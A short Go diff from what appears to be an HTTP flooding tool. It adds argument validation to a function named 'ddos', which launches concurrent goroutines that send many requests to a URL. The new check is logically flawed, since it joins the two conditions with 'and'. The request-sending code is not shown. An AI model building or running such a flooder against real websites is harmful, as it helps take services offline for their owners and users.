@@ -10,6 +10,9 @@ import (
 func ddos(url string, countConcurrent int, countRequest int) {
 	var wg sync.WaitGroup
 	wg.Add(countConcurrent)
+	if countConcurrent <= 0 && countRequest <= 0 {
+		log.Fatal("Concurrent processes or Requests can't be zero or lower!")
+	}
 	fmt.Println("------------ Starting DDOS ---------- url : ", url, " ", "Concurrents : ", countConcurrent, " ", "Requests : ", countRequest)
 	for i := 1; i <= countConcurrent; i++ {
 		go ManyCallHttpRequest(&wg, url, countRequest)
